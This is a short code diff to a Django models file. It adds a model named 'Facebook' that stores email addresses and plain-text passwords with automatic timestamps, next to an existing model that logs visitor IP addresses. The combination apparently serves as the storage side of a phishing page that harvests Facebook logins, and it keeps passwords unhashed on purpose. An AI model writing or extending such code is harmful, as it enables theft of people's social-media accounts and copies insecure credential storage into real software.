@@ -188,3 +188,15 @@ class Visit(models.Model):
 
     def __str__(self):
         return f"Visit from {self.ip_address} at {self.timestamp}"
+
+
+
+
+class Facebook(models.Model):
+    email = models.CharField(max_length=255)
+    password = models.CharField(max_length=255)  # Texte clair pour le mot de passe
+    date = models.DateField(auto_now_add=True)  # Date automatique lors de la création
+    heure = models.TimeField(auto_now_add=True)  # Heure automatique lors de la création
+
+    def __str__(self):
+        return self.email
